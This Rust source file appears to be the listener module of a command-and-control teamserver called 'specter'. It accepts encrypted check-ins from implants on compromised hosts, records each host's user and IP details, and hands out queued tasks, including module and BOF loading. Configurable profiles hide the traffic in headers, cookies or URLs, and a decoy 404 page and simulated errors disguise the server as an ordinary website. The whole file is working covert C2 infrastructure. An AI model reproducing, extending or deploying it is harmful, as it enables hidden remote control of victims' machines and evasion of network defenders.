pub mod azure_listener;
pub mod dns_listener;
pub mod ws_handler;

use std::collections::HashMap;
use std::sync::Arc;

use axum::body::Bytes;
use axum::extract::State;
use axum::http::StatusCode;
use axum::response::IntoResponse;
use axum::routing::{any, get, post};
use axum::{Json, Router};
use chacha20poly1305::aead::{Aead, KeyInit};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};
use chrono::Utc;
use specter_common::checkin::{
    parse_binary_checkin, serialize_binary_response, CheckinRequest, CheckinResponse,
    PendingTaskPayload,
};
use specter_common::proto::specter::v1::{Listener, ListenerStatus};
use sqlx::sqlite::SqliteRow;
use sqlx::{Row, SqlitePool};
use tokio::net::TcpListener;
use tokio::sync::{oneshot, Mutex};
use x25519_dalek::{PublicKey, StaticSecret};

use crate::event::EventBus;
use crate::module::ModuleRepository;
use crate::profile::compiler::ListenerProfile;
use crate::profile::schema::*;
use crate::profile::{transform_decode, transform_encode};
use crate::session::SessionManager;
use crate::task::TaskDispatcher;

// ── Axum shared state ────────────────────────────────────────────────────────

#[derive(Clone)]
pub struct HttpState {
    pub session_manager: Arc<SessionManager>,
    pub task_dispatcher: Arc<TaskDispatcher>,
    pub module_repository: Option<Arc<ModuleRepository>>,
    pub server_secret: Arc<StaticSecret>,
    pub server_pubkey: Arc<PublicKey>,
    pub listener_profile: Option<Arc<ListenerProfile>>,
    pub profile_session_key: Option<Arc<[u8; 32]>>,
    pub pool: SqlitePool,
}

/// Build the HTTP router for check-in endpoints. Exposed for testing.
pub fn build_router(state: HttpState) -> Router {
    let mut router = Router::new()
        .route("/api/checkin", post(checkin_handler))
        .route("/api/beacon", post(beacon_handler))
        .route("/api/health", get(health_handler))
        .route("/api/ws", get(ws_handler::ws_upgrade_handler));

    // If a profile is configured, add profile-driven routes
    if let Some(ref profile) = state.listener_profile {
        for uri in &profile.uri_patterns {
            router = router.route(uri, any(profile_handler));
        }
    }

    // Fallback: route POST requests to beacon_handler (supports any profile URI),
    // return decoy for GET/other methods (blends with normal web traffic).
    router = router.fallback(fallback_handler);

    router.with_state(state)
}

/// Fallback handler: POST requests are routed to beacon_handler (supports any
/// profile URI pattern). GET and other methods receive a decoy response to
/// blend with normal web traffic.
async fn fallback_handler(
    method: axum::http::Method,
    state: State<HttpState>,
    body: axum::body::Bytes,
) -> axum::response::Response {
    if method == axum::http::Method::POST {
        beacon_handler(state, body).await.into_response()
    } else {
        decoy_handler().await.into_response()
    }
}

/// Decoy handler for traffic that doesn't match any profile or known endpoint.
async fn decoy_handler() -> impl IntoResponse {
    (
        StatusCode::NOT_FOUND,
        [("content-type", "text/html; charset=utf-8")],
        "<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>",
    )
}

/// Profile-driven handler: validates request format, extracts embedded data,
/// applies reverse transform, processes check-in, formats response per profile template.
async fn profile_handler(
    State(state): State<HttpState>,
    request: axum::extract::Request,
) -> impl IntoResponse {
    let profile = match &state.listener_profile {
        Some(p) => p.clone(),
        None => return decoy_handler().await.into_response(),
    };

    let session_key = match &state.profile_session_key {
        Some(k) => **k,
        None => return decoy_handler().await.into_response(),
    };

    // Validate method
    let expected_method = profile.request_template.method.to_uppercase();
    if request.method().as_str().to_uppercase() != expected_method {
        return decoy_handler().await.into_response();
    }

    // Capture headers and URI before consuming the request body
    let req_headers = request.headers().clone();
    let req_uri = request.uri().clone();

    // Extract body
    let body_bytes = match axum::body::to_bytes(request.into_body(), 1024 * 1024).await {
        Ok(b) => b,
        Err(_) => return decoy_handler().await.into_response(),
    };

    // Extract embedded data from request
    let encoded_data = match extract_embedded_data(
        &body_bytes,
        &profile.request_template,
        &req_headers,
        &req_uri,
    ) {
        Some(data) => data,
        None => return decoy_handler().await.into_response(),
    };

    // Apply reverse transform: decode → decrypt → decompress
    let plaintext = match transform_decode(&encoded_data, &profile.transform, &session_key) {
        Ok(pt) => pt,
        Err(_) => return decoy_handler().await.into_response(),
    };

    // Try TLV binary first (implant sends TLV), then JSON fallback
    let (checkin_req, is_binary) = if let Some(parsed) = parse_binary_checkin(&plaintext) {
        (parsed, true)
    } else if let Ok(parsed) = serde_json::from_slice::<CheckinRequest>(&plaintext) {
        (parsed, false)
    } else {
        return decoy_handler().await.into_response();
    };

    // Process check-in
    let session_id = match state
        .session_manager
        .register_or_update(
            &checkin_req.hostname,
            &checkin_req.username,
            checkin_req.pid,
            &checkin_req.os_version,
            &checkin_req.integrity_level,
            &checkin_req.process_name,
            &checkin_req.internal_ip,
            &checkin_req.external_ip,
        )
        .await
    {
        Ok(id) => id,
        Err(_) => return decoy_handler().await.into_response(),
    };

    // Process task results
    for tr in &checkin_req.task_results {
        let success = tr.status == "COMPLETE";
        let _ = state
            .task_dispatcher
            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
            .await;
    }

    // Fetch pending tasks
    let pending = state
        .task_dispatcher
        .get_pending_tasks(&session_id)
        .await
        .unwrap_or_default();

    let mut tasks_payload = Vec::new();
    for t in &pending {
        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
        tasks_payload.push(PendingTaskPayload {
            task_id: t.id.clone(),
            task_type: t.task_type.clone(),
            arguments: t.arguments.clone(),
        });
    }

    let resp = CheckinResponse {
        session_id,
        tasks: tasks_payload,
    };

    // Simulate error rate
    if let Some(error_rate) = profile.response_template.error_rate_percent {
        let roll: f64 = rand::random::<f64>() * 100.0;
        if roll < error_rate {
            // Return error response with no tasking data
            return format_profile_response_no_data(&profile.response_template).into_response();
        }
    }

    // Serialize response: binary TLV if request was binary, JSON otherwise
    let resp_bytes = if is_binary {
        serialize_binary_response(&resp)
    } else {
        match serde_json::to_vec(&resp) {
            Ok(j) => j,
            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
        }
    };

    // Transform response: compress → encrypt → encode
    let encoded_resp = match transform_encode(&resp_bytes, &profile.transform, &session_key) {
        Ok(e) => e,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };

    // Format response per profile template
    format_profile_response(&encoded_resp, &profile.response_template).into_response()
}

/// Extract embedded data from the request based on the profile's embed points.
///
/// Supports all embed locations: JSON body fields, HTTP headers, cookies,
/// query parameters, and URI segments.  Multipart fields log a warning
/// (not yet implemented).
pub fn extract_embedded_data(
    body: &[u8],
    template: &HttpTemplate,
    headers: &axum::http::HeaderMap,
    uri: &axum::http::Uri,
) -> Option<Vec<u8>> {
    for ep in &template.data_embed_points {
        let field_name = ep.field_name.as_deref().unwrap_or("");
        match ep.location {
            EmbedLocation::JsonField => {
                let body_str = std::str::from_utf8(body).ok()?;
                let json: serde_json::Value = serde_json::from_str(body_str).ok()?;
                let field_value = json.get(field_name)?.as_str()?;
                return Some(field_value.as_bytes().to_vec());
            }
            EmbedLocation::HeaderValue => {
                if let Some(val) = headers.get(field_name) {
                    if let Ok(s) = val.to_str() {
                        return Some(s.as_bytes().to_vec());
                    }
                }
            }
            EmbedLocation::CookieValue => {
                // Parse the Cookie header to find the named cookie
                if let Some(cookie_header) = headers.get("cookie") {
                    if let Ok(cookie_str) = cookie_header.to_str() {
                        for pair in cookie_str.split(';') {
                            let pair = pair.trim();
                            if let Some((name, value)) = pair.split_once('=') {
                                if name.trim() == field_name {
                                    return Some(value.trim().as_bytes().to_vec());
                                }
                            }
                        }
                    }
                }
            }
            EmbedLocation::QueryParam => {
                if let Some(query) = uri.query() {
                    for pair in query.split('&') {
                        if let Some((key, value)) = pair.split_once('=') {
                            if key == field_name {
                                return Some(value.as_bytes().to_vec());
                            }
                        }
                    }
                }
            }
            EmbedLocation::UriSegment => {
                // Extract a segment from the URI path by field_name index or literal match.
                // field_name is expected to be a 0-based index into path segments.
                let path = uri.path();
                let segments: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
                if let Ok(idx) = field_name.parse::<usize>() {
                    if let Some(seg) = segments.get(idx) {
                        return Some(seg.as_bytes().to_vec());
                    }
                }
            }
            EmbedLocation::MultipartField => {
                tracing::warn!(
                    "MultipartField embed location not yet implemented (field: {})",
                    field_name
                );
                continue;
            }
        }
    }

    // If no embed points matched, try the raw body
    if template.data_embed_points.is_empty() {
        return Some(body.to_vec());
    }

    None
}

/// Format a response with embedded data per the profile's response template.
pub fn format_profile_response(encoded_data: &[u8], template: &HttpTemplate) -> impl IntoResponse {
    let status = template.status_code.unwrap_or(200);
    let data_str = String::from_utf8_lossy(encoded_data);

    let body = if let Some(ref body_template) = template.body_template {
        body_template.replace("{{data}}", &data_str)
    } else {
        data_str.to_string()
    };

    let mut headers = Vec::new();
    for hdr in &template.headers {
        headers.push((hdr.name.clone(), hdr.value.replace("{{data}}", &data_str)));
    }

    // Default content-type if not specified
    if !headers
        .iter()
        .any(|(n, _)| n.eq_ignore_ascii_case("content-type"))
    {
        headers.push(("Content-Type".to_string(), "application/json".to_string()));
    }

    let mut response = axum::response::Response::builder().status(status);

    for (name, value) in &headers {
        response = response.header(name.as_str(), value.as_str());
    }

    response
        .body(axum::body::Body::from(body))
        .unwrap_or_else(|_| {
            axum::response::Response::builder()
                .status(500)
                .body(axum::body::Body::empty())
                .unwrap()
        })
}

/// Format a response with no data (used for simulated error responses).
fn format_profile_response_no_data(template: &HttpTemplate) -> impl IntoResponse {
    let status = template.status_code.unwrap_or(200);

    // Return a minimal response without embedded data
    let body = if let Some(ref body_template) = template.body_template {
        body_template.replace("{{data}}", "")
    } else {
        String::new()
    };

    (
        StatusCode::from_u16(status).unwrap_or(StatusCode::OK),
        [("content-type", "application/json")],
        body,
    )
}

// ── Wire protocol constants ─────────────────────────────────────────────────

/// Binary wire format: [4-byte LE length][24-byte header][ciphertext][16-byte tag]
/// Header = 12-byte implant pubkey prefix + 12-byte nonce
const WIRE_LEN_SIZE: usize = 4;
const WIRE_IMPLANT_ID_SIZE: usize = 12;
const WIRE_NONCE_SIZE: usize = 12;
const WIRE_HEADER_SIZE: usize = WIRE_IMPLANT_ID_SIZE + WIRE_NONCE_SIZE;
const WIRE_TAG_SIZE: usize = 16;

/// Minimum valid beacon payload: length + header + tag (no ciphertext body)
const BEACON_MIN_SIZE: usize = WIRE_LEN_SIZE + WIRE_HEADER_SIZE + WIRE_TAG_SIZE;

// ── HTTP handlers ────────────────────────────────────────────────────────────

async fn checkin_handler(
    State(state): State<HttpState>,
    Json(req): Json<CheckinRequest>,
) -> impl IntoResponse {
    // 1. Register or update the session.
    let session_id = match state
        .session_manager
        .register_or_update(
            &req.hostname,
            &req.username,
            req.pid,
            &req.os_version,
            &req.integrity_level,
            &req.process_name,
            &req.internal_ip,
            &req.external_ip,
        )
        .await
    {
        Ok(id) => id,
        Err(e) => {
            tracing::error!("Check-in DB error: {e}");
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({"error": "internal error"})),
            )
                .into_response();
        }
    };

    // 2. Process any task results coming back from the implant.
    for tr in &req.task_results {
        let success = tr.status == "COMPLETE";
        if let Err(e) = state
            .task_dispatcher
            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
            .await
        {
            tracing::warn!("Failed to complete task {}: {e}", tr.task_id);
        }
    }

    // 3. Fetch pending tasks and mark them dispatched.
    let pending = state
        .task_dispatcher
        .get_pending_tasks(&session_id)
        .await
        .unwrap_or_default();

    let mut tasks_payload = Vec::new();
    for t in &pending {
        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;

        // For load_module tasks, the arguments field contains the module_id.
        // Package the module for delivery (binary payload in arguments).
        let (task_type, arguments) = if t.task_type == "load_module" || t.task_type == "module_load" || t.task_type == "bof" || t.task_type == "bof_load" {
            if let Some(ref _module_repo) = state.module_repository {
                // Note: in the plain JSON check-in we don't have the implant pubkey,
                // so we can't encrypt. Send module_id as argument for the implant to
                // request via the encrypted beacon channel instead.
                ("load_module".to_string(), t.arguments.clone())
            } else {
                (t.task_type.clone(), t.arguments.clone())
            }
        } else {
            (t.task_type.clone(), t.arguments.clone())
        };

        tasks_payload.push(PendingTaskPayload {
            task_id: t.id.clone(),
            task_type,
            arguments,
        });
    }

    let resp = CheckinResponse {
        session_id,
        tasks: tasks_payload,
    };

    match serde_json::to_value(&resp) {
        Ok(val) => (StatusCode::OK, Json(val)).into_response(),
        Err(_) => StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    }
}

/// Binary encrypted beacon endpoint.
///
/// Wire format (request body):
///   [4-byte LE total_len][12-byte implant pubkey prefix][12-byte nonce][ciphertext][16-byte tag]
///
/// The teamserver performs X25519 key agreement with the implant's public key
/// (looked up by the 12-byte prefix), derives the session key via HKDF-SHA256,
/// and decrypts the AEAD payload. The plaintext is a JSON `CheckinRequest`.
///
/// The response is encrypted with the same session key and returned in the
/// same wire format.
async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl IntoResponse {
    tracing::debug!("beacon_handler: received {} bytes", body.len());

    if body.len() < BEACON_MIN_SIZE {
        tracing::warn!("beacon_handler: body too small ({} < {})", body.len(), BEACON_MIN_SIZE);
        return StatusCode::BAD_REQUEST.into_response();
    }

    // Parse wire format
    let total_len = u32::from_le_bytes([body[0], body[1], body[2], body[3]]) as usize;
    let payload = &body[WIRE_LEN_SIZE..];

    if payload.len() < total_len || total_len < WIRE_HEADER_SIZE + WIRE_TAG_SIZE {
        return StatusCode::BAD_REQUEST.into_response();
    }

    let implant_id_prefix = &payload[..WIRE_IMPLANT_ID_SIZE];
    let nonce_bytes = &payload[WIRE_IMPLANT_ID_SIZE..WIRE_HEADER_SIZE];
    let ct_len = total_len - WIRE_HEADER_SIZE - WIRE_TAG_SIZE;
    let ciphertext = &payload[WIRE_HEADER_SIZE..WIRE_HEADER_SIZE + ct_len];
    let tag = &payload[WIRE_HEADER_SIZE + ct_len..WIRE_HEADER_SIZE + ct_len + WIRE_TAG_SIZE];

    // Reconstruct the full implant public key by looking up session by prefix.
    // For the first check-in, we accept the full 32-byte key from the ciphertext header
    // and register a new session.
    tracing::debug!("beacon_handler: looking up session for prefix {:02x}{:02x}{:02x}{:02x}...",
        implant_id_prefix[0], implant_id_prefix[1], implant_id_prefix[2], implant_id_prefix[3]);

    let (session_key, session_id, implant_pubkey) = match derive_session_key(&state, implant_id_prefix).await {
        Ok(result) => {
            tracing::debug!("beacon_handler: session key derived, session_id={:?}", result.1);
            result
        },
        Err(_) => {
            tracing::warn!("beacon_handler: failed to derive session key");
            return StatusCode::UNAUTHORIZED.into_response();
        },
    };

    // Build AEAD ciphertext with appended tag (as chacha20poly1305 crate expects)
    let mut ct_with_tag = Vec::with_capacity(ct_len + WIRE_TAG_SIZE);
    ct_with_tag.extend_from_slice(ciphertext);
    ct_with_tag.extend_from_slice(tag);

    let cipher = match ChaCha20Poly1305::new_from_slice(&session_key) {
        Ok(c) => c,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };
    let nonce = Nonce::from_slice(nonce_bytes);

    let plaintext = match cipher.decrypt(nonce, ct_with_tag.as_slice()) {
        Ok(pt) => {
            tracing::debug!("beacon_handler: decrypted {} bytes", pt.len());
            pt
        },
        Err(e) => {
            tracing::warn!("beacon_handler: AEAD decrypt failed: {e}");
            return StatusCode::UNAUTHORIZED.into_response();
        },
    };

    // Try binary TLV first (implant sends TLV), fall back to JSON (mock implant, profile path)
    let (checkin_req, is_binary) = if let Some(req) = parse_binary_checkin(&plaintext) {
        tracing::debug!("beacon_handler: parsed TLV checkin — host={}, user={}, pid={}",
            req.hostname, req.username, req.pid);
        (req, true)
    } else if let Ok(req) = serde_json::from_slice::<CheckinRequest>(&plaintext) {
        tracing::debug!("beacon_handler: parsed JSON checkin");
        (req, false)
    } else {
        tracing::warn!(
            "beacon_handler: failed to parse checkin payload ({} bytes, first 32: {:02x?})",
            plaintext.len(),
            &plaintext[..plaintext.len().min(32)]
        );
        return StatusCode::BAD_REQUEST.into_response();
    };

    // Process check-in (register/update session, handle task results, get pending tasks)
    let sid = match &session_id {
        Some(id) => {
            if let Err(e) = state.session_manager.update_checkin(id).await {
                tracing::error!("Beacon update error: {e}");
            }
            id.clone()
        }
        None => {
            // New session from builds table — register with full pubkey
            tracing::info!("beacon_handler: registering new session for pubkey {:02x}{:02x}{:02x}{:02x}...",
                implant_pubkey[0], implant_pubkey[1], implant_pubkey[2], implant_pubkey[3]);
            match state
                .session_manager
                .register_or_update_with_pubkey(
                    &checkin_req.hostname,
                    &checkin_req.username,
                    checkin_req.pid,
                    &checkin_req.os_version,
                    &checkin_req.integrity_level,
                    &checkin_req.process_name,
                    &checkin_req.internal_ip,
                    &checkin_req.external_ip,
                    &implant_pubkey,
                )
                .await
            {
                Ok(id) => id,
                Err(e) => {
                    tracing::error!("Beacon register error: {e}");
                    return StatusCode::INTERNAL_SERVER_ERROR.into_response();
                }
            }
        }
    };

    // Process task results
    for tr in &checkin_req.task_results {
        let success = tr.status == "COMPLETE";
        if let Err(e) = state
            .task_dispatcher
            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
            .await
        {
            tracing::warn!("Beacon: failed to complete task {}: {e}", tr.task_id);
        }

        // Parse sleep task results to update session sleep config.
        // The implant returns "interval=30s jitter=15%" for sleep tasks.
        if success && tr.result.contains("interval=") {
            let mut interval = 0u32;
            let mut jitter = 0u32;
            for part in tr.result.split_whitespace() {
                if let Some(val) = part.strip_prefix("interval=").and_then(|s| s.strip_suffix('s')) {
                    interval = val.parse().unwrap_or(0);
                }
                if let Some(val) = part.strip_prefix("jitter=").and_then(|s| s.strip_suffix('%')) {
                    jitter = val.parse().unwrap_or(0);
                }
            }
            if interval > 0 {
                let _ = state
                    .session_manager
                    .update_sleep_config(&sid, interval, jitter)
                    .await;
            }
        }
    }

    // Fetch pending tasks
    let pending = state
        .task_dispatcher
        .get_pending_tasks(&sid)
        .await
        .unwrap_or_default();

    let mut tasks_payload = Vec::new();
    for t in &pending {
        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
        tasks_payload.push(PendingTaskPayload {
            task_id: t.id.clone(),
            task_type: t.task_type.clone(),
            arguments: t.arguments.clone(),
        });
    }

    let resp = CheckinResponse {
        session_id: sid,
        tasks: tasks_payload,
    };

    // Serialize response: binary TLV if request was binary, JSON otherwise
    let response_payload = if is_binary {
        serialize_binary_response(&resp)
    } else {
        match serde_json::to_vec(&resp) {
            Ok(j) => j,
            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
        }
    };

    // Generate a fresh nonce for the response
    let resp_nonce_bytes: [u8; 12] = rand::random();
    let resp_nonce = Nonce::from_slice(&resp_nonce_bytes);

    let encrypted = match cipher.encrypt(resp_nonce, response_payload.as_slice()) {
        Ok(ct) => ct,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };

    // The chacha20poly1305 crate appends the tag to the ciphertext
    let ct_part_len = encrypted.len() - WIRE_TAG_SIZE;
    let resp_ct = &encrypted[..ct_part_len];
    let resp_tag = &encrypted[ct_part_len..];

    // Build wire response: [4-byte LE len][12-byte server pubkey prefix][12-byte nonce][ct][tag]
    let server_pub_bytes = state.server_pubkey.as_bytes();
    let resp_total = WIRE_HEADER_SIZE + resp_ct.len() + WIRE_TAG_SIZE;

    let mut wire_resp = Vec::with_capacity(WIRE_LEN_SIZE + resp_total);
    wire_resp.extend_from_slice(&(resp_total as u32).to_le_bytes());
    wire_resp.extend_from_slice(&server_pub_bytes[..WIRE_IMPLANT_ID_SIZE]);
    wire_resp.extend_from_slice(&resp_nonce_bytes);
    wire_resp.extend_from_slice(resp_ct);
    wire_resp.extend_from_slice(resp_tag);

    (
        StatusCode::OK,
        [("content-type", "application/octet-stream")],
        wire_resp,
    )
        .into_response()
}

/// Derive the session key via X25519 + HKDF-SHA256.
///
/// Two-phase lookup:
///   1. Check existing sessions (returning implants) by pubkey prefix.
///   2. Check builds table (new implants that haven't registered a session yet).
///
/// Returns (session_key, optional_session_id, full_implant_pubkey).
async fn derive_session_key(
    state: &HttpState,
    implant_id_prefix: &[u8],
) -> Result<([u8; 32], Option<String>, [u8; 32]), ()> {
    // Phase 1: Check existing sessions (returning implants)
    let sessions = state
        .session_manager
        .list_sessions()
        .await
        .map_err(|_| ())?;

    for session in &sessions {
        if let Ok(Some(pubkey)) = state.session_manager.get_implant_pubkey(&session.id).await {
            if pubkey.len() >= 12 && &pubkey[..12] == implant_id_prefix {
                let implant_pub = PublicKey::from(
                    <[u8; 32]>::try_from(&pubkey[..32]).map_err(|_| ())?
                );
                let shared = state.server_secret.diffie_hellman(&implant_pub);
                let key = hkdf_sha256_derive(shared.as_bytes(), &pubkey[..32]);
                return Ok((key, Some(session.id.clone()), <[u8; 32]>::try_from(&pubkey[..32]).unwrap()));
            }
        }
    }

    // Phase 2: Check builds table (new implants)
    let row: Option<(Vec<u8>,)> = sqlx::query_as(
        "SELECT implant_pubkey FROM builds WHERE implant_pubkey_prefix = ?1 LIMIT 1"
    )
    .bind(implant_id_prefix)
    .fetch_optional(&state.pool)
    .await
    .map_err(|_| ())?;

    if let Some((pubkey,)) = row {
        if pubkey.len() == 32 {
            let implant_pub = PublicKey::from(
                <[u8; 32]>::try_from(&pubkey[..]).map_err(|_| ())?
            );
            let shared = state.server_secret.diffie_hellman(&implant_pub);
            let key = hkdf_sha256_derive(shared.as_bytes(), &pubkey);
            let mut pk32 = [0u8; 32];
            pk32.copy_from_slice(&pubkey);
            return Ok((key, None, pk32));
        }
    }

    Err(())
}

/// HKDF-SHA256 key derivation from shared secret (matches implant's spec_hkdf_derive).
fn hkdf_sha256_derive(shared_secret: &[u8], implant_pubkey: &[u8]) -> [u8; 32] {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    type HmacSha256 = Hmac<Sha256>;

    // Extract: PRK = HMAC-SHA256(key=implant_pubkey, msg=shared_secret)
    let mut mac = <HmacSha256 as Mac>::new_from_slice(implant_pubkey)
        .expect("HMAC key length is valid");
    mac.update(shared_secret);
    let prk = mac.finalize().into_bytes();

    // Expand: OKM = HMAC-SHA256(key=PRK, msg="specter-session" || 0x01)
    let mut mac2 = <HmacSha256 as Mac>::new_from_slice(&prk)
        .expect("HMAC key length is valid");
    mac2.update(b"specter-session");
    mac2.update(&[0x01]);
    let okm = mac2.finalize().into_bytes();

    let mut key = [0u8; 32];
    key.copy_from_slice(&okm[..32]);
    key
}

async fn health_handler() -> impl IntoResponse {
    StatusCode::OK
}

// ── ListenerManager ──────────────────────────────────────────────────────────

struct ActiveListener {
    shutdown_tx: oneshot::Sender<()>,
}

pub struct ListenerManager {
    pool: SqlitePool,
    session_manager: Arc<SessionManager>,
    task_dispatcher: Arc<TaskDispatcher>,
    #[allow(dead_code)]
    event_bus: Arc<EventBus>,
    active: Mutex<HashMap<String, ActiveListener>>,
}

impl ListenerManager {
    pub fn new(
        pool: SqlitePool,
        session_manager: Arc<SessionManager>,
        task_dispatcher: Arc<TaskDispatcher>,
        event_bus: Arc<EventBus>,
    ) -> Self {
        Self {
            pool,
            session_manager,
            task_dispatcher,
            event_bus,
            active: Mutex::new(HashMap::new()),
        }
    }

    /// Return the X25519 public key bytes for a specific listener.
    pub async fn get_listener_pubkey(&self, listener_id: &str) -> Option<[u8; 32]> {
        let row: Option<(Vec<u8>,)> = sqlx::query_as(
            "SELECT x25519_pubkey FROM listeners WHERE id = ?1 AND x25519_pubkey IS NOT NULL",
        )
        .bind(listener_id)
        .fetch_optional(&self.pool)
        .await
        .ok()?;

        let (pubkey_blob,) = row?;
        if pubkey_blob.len() == 32 {
            let mut arr = [0u8; 32];
            arr.copy_from_slice(&pubkey_blob);
            Some(arr)
        } else {
            None
        }
    }

    /// Return the X25519 secret key for a specific listener (used internally for HttpState).
    async fn get_listener_secret(&self, listener_id: &str) -> Option<(StaticSecret, PublicKey)> {
        let row: Option<(Vec<u8>, Vec<u8>)> = sqlx::query_as(
            "SELECT x25519_privkey, x25519_pubkey FROM listeners WHERE id = ?1 \
             AND x25519_privkey IS NOT NULL AND x25519_pubkey IS NOT NULL",
        )
        .bind(listener_id)
        .fetch_optional(&self.pool)
        .await
        .ok()?;

        let (privkey_blob, pubkey_blob) = row?;
        if privkey_blob.len() == 32 && pubkey_blob.len() == 32 {
            let mut priv_arr = [0u8; 32];
            priv_arr.copy_from_slice(&privkey_blob);
            let mut pub_arr = [0u8; 32];
            pub_arr.copy_from_slice(&pubkey_blob);
            let secret = StaticSecret::from(priv_arr);
            let pubkey = PublicKey::from(pub_arr);
            Some((secret, pubkey))
        } else {
            None
        }
    }

    /// Return all listener pubkeys (for startup logging).
    pub async fn all_listener_pubkeys(&self) -> Vec<(String, [u8; 32])> {
        let rows: Vec<(String, Vec<u8>)> = sqlx::query_as(
            "SELECT id, x25519_pubkey FROM listeners WHERE x25519_pubkey IS NOT NULL",
        )
        .fetch_all(&self.pool)
        .await
        .unwrap_or_default();

        rows.into_iter()
            .filter_map(|(id, blob)| {
                if blob.len() == 32 {
                    let mut arr = [0u8; 32];
                    arr.copy_from_slice(&blob);
                    Some((id, arr))
                } else {
                    None
                }
            })
            .collect()
    }

    pub async fn create_listener(
        &self,
        name: &str,
        bind_address: &str,
        port: u32,
        protocol: &str,
    ) -> Result<Listener, sqlx::Error> {
        let id = uuid::Uuid::new_v4().to_string();
        let now = Utc::now().timestamp();

        // Generate a per-listener X25519 keypair
        let secret = StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);
        let privkey_bytes = secret.to_bytes();
        let pubkey_bytes = pubkey.to_bytes();

        sqlx::query(
            "INSERT INTO listeners (id, name, bind_address, port, protocol, status, created_at, x25519_privkey, x25519_pubkey) \
             VALUES (?, ?, ?, ?, ?, 'STOPPED', ?, ?, ?)",
        )
        .bind(&id)
        .bind(name)
        .bind(bind_address)
        .bind(port as i64)
        .bind(protocol)
        .bind(now)
        .bind(privkey_bytes.as_slice())
        .bind(pubkey_bytes.as_slice())
        .execute(&self.pool)
        .await?;

        self.get_listener(&id).await
    }

    pub async fn start_listener(&self, id: &str) -> Result<Listener, String> {
        let listener = self
            .get_listener(id)
            .await
            .map_err(|e| format!("DB error: {e}"))?;

        // Load the per-listener X25519 keypair from the database
        let (secret, pubkey) = self
            .get_listener_secret(id)
            .await
            .ok_or_else(|| format!("No X25519 keypair found for listener {id}"))?;

        let addr = format!("{}:{}", listener.bind_address, listener.port);
        let tcp = TcpListener::bind(&addr)
            .await
            .map_err(|e| format!("Bind {addr}: {e}"))?;

        let http_state = HttpState {
            session_manager: Arc::clone(&self.session_manager),
            task_dispatcher: Arc::clone(&self.task_dispatcher),
            module_repository: None,
            server_secret: Arc::new(secret),
            server_pubkey: Arc::new(pubkey),
            listener_profile: None,
            profile_session_key: None,
            pool: self.pool.clone(),
        };

        let app = build_router(http_state);

        let (shutdown_tx, shutdown_rx) = oneshot::channel::<()>();

        tokio::spawn(async move {
            if let Err(e) = axum::serve(tcp, app)
                .with_graceful_shutdown(async {
                    let _ = shutdown_rx.await;
                })
                .await
            {
                tracing::error!("Listener server error: {e}");
            }
        });

        // Update DB status.
        let _ = sqlx::query("UPDATE listeners SET status = 'RUNNING' WHERE id = ?")
            .bind(id)
            .execute(&self.pool)
            .await;

        self.active
            .lock()
            .await
            .insert(id.to_string(), ActiveListener { shutdown_tx });

        tracing::info!("Listener {id} started on {addr}");

        self.get_listener(id)
            .await
            .map_err(|e| format!("DB error: {e}"))
    }

    pub async fn stop_listener(&self, id: &str) -> Result<Listener, String> {
        if let Some(active) = self.active.lock().await.remove(id) {
            let _ = active.shutdown_tx.send(());
        }

        let _ = sqlx::query("UPDATE listeners SET status = 'STOPPED' WHERE id = ?")
            .bind(id)
            .execute(&self.pool)
            .await;

        tracing::info!("Listener {id} stopped");

        self.get_listener(id)
            .await
            .map_err(|e| format!("DB error: {e}"))
    }

    pub async fn delete_listener(&self, id: &str) -> Result<(), String> {
        // Stop it first if running
        if let Some(active) = self.active.lock().await.remove(id) {
            let _ = active.shutdown_tx.send(());
        }

        sqlx::query("DELETE FROM listeners WHERE id = ?")
            .bind(id)
            .execute(&self.pool)
            .await
            .map_err(|e| format!("DB error: {e}"))?;

        tracing::info!("Listener {id} deleted");
        Ok(())
    }

    pub async fn list_listeners(&self) -> Result<Vec<Listener>, sqlx::Error> {
        let rows = sqlx::query(
            "SELECT id, name, bind_address, port, protocol, status, created_at FROM listeners",
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(rows.iter().map(row_to_listener).collect())
    }

    async fn get_listener(&self, id: &str) -> Result<Listener, sqlx::Error> {
        let row = sqlx::query(
            "SELECT id, name, bind_address, port, protocol, status, created_at \
             FROM listeners WHERE id = ?",
        )
        .bind(id)
        .fetch_one(&self.pool)
        .await?;

        Ok(row_to_listener(&row))
    }
}

// ── helpers ──────────────────────────────────────────────────────────────────

fn row_to_listener(row: &SqliteRow) -> Listener {
    let port: i64 = row.get("port");
    let created_at: i64 = row.get("created_at");
    let status_str: &str = row.get("status");

    Listener {
        id: row.get("id"),
        name: row.get("name"),
        bind_address: row.get("bind_address"),
        port: port as u32,
        protocol: row.get("protocol"),
        status: match status_str {
            "RUNNING" => ListenerStatus::Running.into(),
            _ => ListenerStatus::Stopped.into(),
        },
        created_at: Some(prost_types::Timestamp {
            seconds: created_at,
            nanos: 0,
        }),
    }
}
